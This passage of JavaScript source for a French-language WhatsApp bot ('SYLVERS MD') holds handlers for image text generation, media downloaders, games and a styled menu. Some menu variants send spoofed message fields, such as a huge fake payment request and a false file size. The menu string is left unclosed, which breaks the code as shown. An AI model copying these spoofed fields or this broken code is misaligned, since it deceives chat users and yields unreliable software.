					Kev.sendMessage(m.chat, { image: fs.readFileSync('./recherche/write/images/book/afterright.jpg'), caption: 'We The Best!!!' }, { quoted: m })
				})
			}
			break
			case 'folioleft': {
				if (!text) return replygckev(`Send command *${prefix + command}* text`)
				KevStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./recherche/write/images/folio/beforeleft.jpg',
					'-font',
					'./recherche/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+48+185',
					fixHeight,
					'./recherche/write/images/folio/afterleft.jpg'
				])
				.on('error', () => replygckev(mess.error))
				.on('exit', () => {
					Kev.sendMessage(m.chat, { image: fs.readFileSync('./recherche/write/images/folio/afterleft.jpg'), caption: 'We The Best!!!' }, { quoted: m })
				})
			}
			break
			case 'folioright': {
				if (!text) return replygckev(`Send command *${prefix + command}* text`)
				KevStickWait()
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./recherche/write/images/folio/beforeright.jpg',
					'-font',
					'./recherche/write/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+89+190',
					fixHeight,
					'./recherche/write/images/folio/afterright.jpg'
				])
				.on('error', () => replygckev(mess.error))
				.on('exit', () => {
					Kev.sendMessage(m.chat, { image: fs.readFileSync('./recherche/write/images/folio/afterright.jpg'), caption: 'We The Best!!!' }, { quoted: m })
				})
			}
			break
			
			// Ai Menu
			case 'ai2': case 'gpt2': case 'openai2': {
				if (!text) return replygckev(`Example: ${prefix + command} item`)
				const hasil = await chatGpt(text);
				replygckev(hasil)
			}
			break
			// Search Menu
			case 'play':  case 'song': {
if (!text) return replygckev(`Example : ${prefix + command} anime whatsapp status`)
try {
const kevplaymp3 = require('./bibliotheque/ytdl')
let yts = require("youtube-yts")
        let search = await yts(text)
        let anup3k = search.videos[0]
const pl= await kevplaymp3.mp3(anup3k.url)
await Kev.sendMessage(m.chat,{
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:anup3k.title,
            body: botname,
            thumbnail: await fetchBuffer(pl.meta.image),
            sourceUrl: websitex,
            mediaType:2,
            mediaUrl:anup3k.url,
        }

    },
},{quoted:m})
await fs.unlinkSync(pl.path)
}catch{
	replygckev(`Music introuvable.`)
	}
}
break
			
			case 'pixiv': {
				if (!text) return replygckev(`Exemple: ${prefix + command} Tonton Kev`)
				try {
					let { pixivdl } = require('./bibliotheque/pixiv')
					let res = await pixivdl(text)
					KevStickWait()
					for (let i = 0; i < res.media.length; i++) {
						let caption = i == 0 ? `${res.caption}\n\n*Par:* ${res.artist}\n*Tags:* ${res.tags.join(', ')}` : ''
						let mime = (await FileType.fromBuffer(res.media[i])).mime 
						await Kev.sendMessage(m.chat, { [mime.split('/')[0]]: res.media[i], caption, mimetype: mime }, { quoted: m })
					}
				} catch (e) {
					replygckev('Recherche introuvable !')
				}
			}
			break
			case 'pinterest': case 'pin': {
  if (!text) return replygckev(`Titre?`);
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: Kev.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Randomize arrays
  let ult = res.splice(0, 5); // Takes the first 10 images from a randomized array
  let i = 1;
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `_*Voici le resultat de: ${text}*_`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: botname
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `Image - ${i++}`,
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {quoted:m});
  await Kev.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}
break
			case 'wallpaper': {
                if (!text) return replygckev('Veuillez Entrer Le Titre ')
                await KevStickWait()
		let { wallpaper } = require('./bibliotheque/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de ${text}*_\n\n${themeemoji} Titre : ${result.title}\n${themeemoji} Categorie : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: Kev.waUploadToServer })
          }), 
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})                
            }
            break
			case 'ringtone': {
				if (!text) return replygckev(`Exemple: ${prefix + command} black clover`)
				let anu = await ringtone(text)
				let result = pickRandom(anu)
				await Kev.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title + '.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
			
			// Downloader Menu
case 'yt-mp3': case 'yt-audio': case 'ytplayaudio': {
				if (!text) return replygckev(`Exemple: ${prefix + command} youtube_url`)
				if (!text.includes('youtu')) return replygckev('Il ne s agit pas d un lien YouTube!')
				const hasil = await ytMp3(text);
				KevStickWait()
				await Kev.sendMessage(m.chat, {
					audio: { url: hasil.result },
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: hasil.title,
							body: hasil.channel,
							previewType: 'PHOTO',
							thumbnailUrl: hasil.thumb,
							mediaType: 1,
							renderLargerThumbnail: true,
							sourceUrl: text
						}
					}
				}, { quoted: m });
			}
			break
			case 'yt-mp4': case 'yt-video': case 'ytplayvideo': {
				if (!text) return replygckev(`Example: ${prefix + command} url_youtube`)
				if (!text.includes('youtu')) return replygckev('il ne s agit pas d un lien youtube !')
				const hasil = await ytMp4(text);
				KevStickWait()
				await Kev.sendMessage(m.chat, { video: { url: hasil.result }, caption: `*📍Title:* ${hasil.title}\n*✏Description:* ${hasil.desc ? hasil.desc : ''}\n*🚀Channel:* ${hasil.channel}\n*🗓Upload at:* ${hasil.uploadDate}` }, { quoted: m });
			}
			break
			case 'apk': {
	try {
    if (command === 'apk') {
      if (!text) return replygckev(`*[❗] Veuillez entrer le nom de l apk recherchee.*`);
      let data = await download(text);
      if (data.size.replace(' MB', '') > 200) {
        return await Kev.sendMessage(m.chat, { text: '*[⛔] le fichier est très lourd .*' }, { quoted: m });
      }
      if (data.size.includes('GB')) {
        return await Kev.sendMessage(m.chat, { text: '*[⛔] le fichier est très lourd .*' }, { quoted: m });
      }
      await Kev.sendMessage(
        m.chat,
        { document: { url: data.dllink }, mimetype: 'application/vnd.android.package-archive', fileName: data.name + '.apk', caption: null },
        { quoted: m }
      )
    }
  } catch {
    return replygckev(`*[❗] une erreur a ete rencontree. Veuillez vous rassurer qu il s agit d un lien valide.*`);
  }
};
break
case 'mega':{
	try {
if (!text) return replygckev(`${prefix + command} https://mega.nz/file/ovJTHaQZ#yAbkrvQgykcH_NDKQ8eIc0zvsN7jonBbHZ_HTQL6lZ8`);
const { File } = require('megajs');
        const file = File.fromURL(text);
        await file.loadAttributes();
        if (file.size >= 300000000) return replygckev('le fichier est trop lourd (Maximum Size: 300MB)');
        const downloadingMessage = `🌩️ Telechargemen encours... `;
        replygckev(downloadingMessage);
        const caption = `*_Telechargement reussi..._*\nFichier: ${file.name}\nSize: ${formatBytes(file.size)}`;
        const data = await file.downloadBuffer();
        const fileExtension = path.extname(file.name).toLowerCase();
        const mimeTypes = {
            ".mp4": "video/mp4",
            ".pdf": "application/pdf",
            ".zip": "application/zip",
            ".rar": "application/x-rar-compressed",
            ".7z": "application/x-7z-compressed",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".png": "image/png",
        };
        let mimetype = mimeTypes[fileExtension] || "application/octet-stream";
        await Kev.sendMessage(m.chat, {document: data, mimetype: mimetype, fileName: file.name, caption: caption}, {quoted:m});
    } catch (error) {
        return replygckev(`Erreur: ${error.message}`);
    }
}
break
			case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return replygckev(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return replygckev('Lien Invalide!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: te
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url:HD}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
} catch (e) {
  	replygckev(`Verifiez qu il s agit d un lien valide`)
	}
}
break
			case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!args[0]) {
    return replygckev(`Veuillez entrer le lien de la video Facebook\n\nEXEMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replygckev('Url invalide')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ FACEBOOK DL ]
${themeemoji} Titre: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    Kev.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    replygckev('video privee!')
  }
  }
  break
			case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return replygckev(`veuilez entrer un lien insta`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return replygckev(`une erreur est survenue : ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return replygckev(`Fichier introuvable.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `Voici ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: {url: mediaURL}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
    } else if (mediaType === 'image') {
    	let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: cap
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: mediaURL}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  ✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
    }
  }
}
break
			case 'tiktok': case 'tiktokdown': case 'ttdown': case 'ttdl': case 'tt': case 'ttmp4': case 'ttvideo': case 'tiktokmp4': case 'tiktokvideo': {
				if (!text) return replygckev(`Exemple: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return replygckev('Url invalid !')
				const hasil = await tiktokDl(text);
				KevStickWait()
				if (hasil.size_nowm) {
					await Kev.sendFileUrl(m.chat, hasil.data[1].url, `*📍Titre:* ${hasil.title}\n*⏳Duree:* ${hasil.duration}\n*🎃Auteur:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
				} else {
					for (let i = 0; i < hasil.data.length; i++) {
						await Kev.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i+1}`, m)
					}
				}
			}
			break
			case 'ttmp3': case 'tiktokmp3': case 'ttaudio': case 'tiktokaudio': {
				if (!text) return replygckev(`Exemple: ${prefix + command} url_tiktok`)
				if (!text.includes('tiktok.com')) return replygckev('Url invalid!')
				const hasil = await tiktokDl(text);
				KevStickWait()
				await Kev.sendMessage(m.chat, {
					audio: { url: hasil.music_info.url },
					mimetype: 'audio/mpeg',
					contextInfo: {
						externalAdReply: {
							title: 'TikTok • ' + hasil.author.nickname,
							body: hasil.stats.likes + ' suka, ' + hasil.stats.comment + ' komentar. ' + hasil.title,
							previewType: 'PHOTO',
							thumbnailUrl: hasil.cover,
							mediaType: 1,
							renderLargerThumbnail: true,
							sourceUrl: text
						}
					}
				}, { quoted: m });
			}
			break
			
			// Fun Menu
			case 'dice': {
				let ddsa = [{ url: 'https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png', no: 1 },{ url: 'https://telegra.ph/file/797f86e444755282374ef.png', no: 2 },{ url: 'https://telegra.ph/file/970d2a7656ada7c579b69.png', no: 3 },{ url: 'https://telegra.ph/file/0470d295e00ebe789fb4d.png', no: 4 },{ url: 'https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png', no: 5 },{ url: 'https://telegra.ph/file/99dcd999991a79f9ba0c0.png', no: 6 }]
				let media = pickRandom(ddsa)
				await Kev.sendImageAsSticker(m.chat, media.url, m, { packname: global.packname, author: global.author, isAvatar: 1 })
			}
			break
			
			// Game Menu
			case 'slot': {
				await gameSlot(Kev, m, global.db.users)
			}
			break
			case 'casino': {
				await gameCasinoSolo(Kev, m, prefix, global.db.users)
			}
			break
			case 'robber': case 'rob': {
				await gameMerampok(m, global.db.users)
			}
			break
			case 'suitpvp': case 'suit': {
				let poin = 10
				let poin_lose = 10
				let timeout = 60000
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygckev(`Finish your previous suit`)
				if (m.mentionedJid[0] === m.sender) return replygckev(`Can't play with myself !`)
				if (!m.mentionedJid[0]) return replygckev(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[0]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
				if (Object.values(game.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygckev(`The person you are challenging is playing suit with someone else :(`)
				let id = 'suit_' + new Date() * 1
				let caption = `_*SUIT PvP*_\n\n@${m.sender.split`@`[0]} challenge @${m.mentionedJid[0].split`@`[0]} to play suits\n\nPlease @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
				game.suit[id] = {
					chat: replygckev(caption),
					id: id,
					p: m.sender,
					p2: m.mentionedJid[0],
					status: 'wait',
					waktu: setTimeout(() => {
						if (game.suit[id]) replygckev(`_Suit time is up_`)
						delete game.suit[id]
					}, 60000), poin, poin_lose, timeout
				}
			}
			break
			case 'ttc': case 'ttt': case 'tictactoe': {
				let TicTacToe = require('./bibliotheque/tictactoe');
				if (Object.values(game.tictactoe).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygckev(`You are still in the game!\nType *${prefix}del${command}* If you want to end the session`);
				let room = Object.values(game.tictactoe).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
				if (room) {
					replygckev('Partner found!')
					room.o = m.chat
					room.game.playerO = m.sender
					room.state = 'PLAYING'
					let arr = room.game.render().map(v => {
						return {X: '❌',O: '⭕',1: '1️⃣',2: '2️⃣',3: '3️⃣',4: '4️⃣',5: '5️⃣',6: '6️⃣',7: '7️⃣',8: '8️⃣',9: '9️⃣'}[v]
					})
					let str = `Room ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nWaiting @${room.game.currentTurn.split('@')[0]}\n\nType *surrender* to give up and admit defeat`
					if (room.x !== room.o) await Kev.sendMessage(room.x, { texr: str, mentions: parseMention(str) }, { quoted: m })
					await Kev.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m })
				} else {
					room = {
						id: 'tictactoe-' + (+new Date),
						x: m.chat,
						o: '',
						game: new TicTacToe(m.sender, 'o'),
						state: 'WAITING',
						waktu: setTimeout(() => {
							if (game.tictactoe[roomnya.id]) replygckev(`_Time ${command} finished_`)
							delete game.tictactoe[roomnya.id]
						}, 300000)
					}
					if (text) room.name = text
					Kev.sendMessage(m.chat, { text: 'Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''), mentions: m.mentionedJid }, { quoted: m })
					game.tictactoe[room.id] = room
				}
			}
			break
			case 'play-bomb': case 'bomb': {
				if (game.tebakbom[m.sender]) return replygckev('There Are Still Unfinished Sessions!')
				function shuffle(array) {
					return array.sort(() => Math.random() - 0.5);
				}
				game.tebakbom[m.sender] = {
					petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
					board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'],
					bomb: 3,
					lolos: 7,
					pick: 0,
					nyawa: ['❤️', '❤️', '❤️'],
					waktu: setTimeout(() => {
						if (game.tebakbom[m.sender]) replygckev(`_Time ${command} finished_`)
						delete game.tebakbom[m.sender];
					}, 120000)
				}
				replygckev(`*GUESS THE BOMB*\n\n${game.tebakbom[m.sender].board.join("")}\n\nChoose that number! and don't get hit by a bomb!\nBomb : ${game.tebakbom[m.sender].bomb}\nLife : ${game.tebakbom[m.sender].nyawa.join("")}`);
			}
			break
			case 'math-quiz': case 'math': {
				const { genMath, modes } = require('./bibliotheque/math');
				const inputMode = ['noob', 'easy', 'medium', 'hard','extreme','impossible','impossible2'];
				if (!text) return replygckev(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
				if (!inputMode.includes(text.toLowerCase())) return replygckev('Mode not found!')
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) return replygckev('There Are Still Unfinished Sessions!')
				let result = await genMath(text.toLowerCase())
				replygckev(`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} detik`).then(() => {
					game.kuismath[m.sender.split('@')[0]] = {
						jawaban: result.jawaban,
						mode: text.toLowerCase()
					}
				})
				await sleep(result.waktu)
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) {
					replygckev('Time has run out\nAnswer: ' + game.kuismath[m.sender.split('@')[0]].jawaban)
					delete game.kuismath[m.sender.split('@')[0]]
				}
			}
			break
			
			// Menu
		    case 'menu': case 'help': case 'alive': {
            const timestampe = speed()
            const latensie = speed() - timestampe
            const a = db.users[sender]
            const me = m.sender
			const kevmenu_oh = `
╭─✣「 *SYLVERS MD* 」✣─╮
│➠ *Hey 🍁*
│➠ *${m.pushName}* 
│➠ *${Kevinoutimewisher}* 
╰───────── ${readmore}
╭───✣「 *UTILISATEUR* 」✣╮
│➠ *Nom Utilisateur* : ${m.pushName ? m.pushName : 'No name'}
│➠ *Numero* : +${me.split('@')[0]}
│➠ *Identifiant* : @${m.sender.split('@')[0]}
│➠ *Utilisateur* : ${isVip ? 'VIP' : isPremium ? 'BOSS' : 'RANDOM'}
│➠ *Limite* : ${isVip ? 'VIP' : global.db.users[m.sender].limit }
│➠ *Solde Du Compte* : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰──────────────────╯
╭──✣「 *INFO DU BOT* 」✣─╮
│➠ *Rapiditey* : ${latensie.toFixed(4)} miliseconds
│➠ *Temps Actif* : ${runtime(process.uptime())}
│➠ *Host* : ${os.hostname()}
│➠ *Platform* : ${os.platform()}
│➠ *Nom Du Bot* : ${global.botname}
│➠ *Proprio* : @${ownernumber[0].split('@')[0]}
│➠ *Mode* : ${Kev.public ? 'Public' : 'Self'}
│➠ *Nombre Utilisateurs* : ${Object.keys(global.db.users).length} User
│➠ *Total Hit* : ${global.db.settings[botNumber].totalhit} Hit
│➠ *Total Chat* : ${Object.keys(global.db.groups).length} Chat/Gc
│➠ *Prefix* :「 ${kevprefix} 」
╰──────────────────╯
╭────✣「 *TEMPS* 」✣──╮
│➠ *Date* : ${kevdate}
│➠ *Jour* : ${kevjour}
│➠ *Heure* : ${kevheure}
╰─────────────────╯
╭───✣「 *MENU* 」✣────╮
│${setv} ╭───────────╮
│${setv} │ ${prefix}tout-menu
│${setv} │ ${prefix}menu-recherche
│${setv} │ ${prefix}menu-telechargement
│${setv} │ ${prefix}menu-jeux
│${setv} │ ${prefix}menu-fun
│${setv} │ ${prefix}ai-menu
│${setv} │ ${prefix}menu-groupe
│${setv} │ ${prefix}menu-proprio
│${setv} │ ${prefix}menu-conversion
│${setv} │ ${prefix}liste-menu
│${setv} │ ${prefix}menu-anime
│${setv} │ ${prefix}menu-18
│${setv} │ ${prefix}menu-randomphoto
│${setv} │ ${prefix}menu-randomvideo
│${setv} │ ${prefix}menu-sticker
│${setv} │ ${prefix}menu-database
│${setv} │ ${prefix}bug-menu
│${setv} │ ${prefix}menu-divers
│${setv} ╰────────────╯
╰───────────────────╯
if (typemenu === 's1') {
                    Kev.sendMessage(m.chat, {
                        image: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's2') {
                    Kev.sendMessage(m.chat, {
                        text: kevmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 's3') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's4') {
                    Kev.sendMessage(m.chat, {
                        video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
                        caption: kevmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 's5') {
                    Kev.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: kevmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 's6') {
                    Kev.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'USD',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: kevmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 's7') {
                    Kev.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: kevmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./KevFile/theme/sylvers.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 's8') {
                	Kev.sendMessage(m.chat, {
      video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
      gifPlayback: true,
      caption: kevmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: m
                    })
      } else if (typemenu === 's9') {
                	Kev.sendMessage(m.chat, {
video: fs.readFileSync('./KevFile/theme/Sylvers.mp4'),
caption: kevmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: global.xchannel.jid,
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://telegra.ph/file/2800c0d2e02e3afcb4033.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 's10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: kevmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
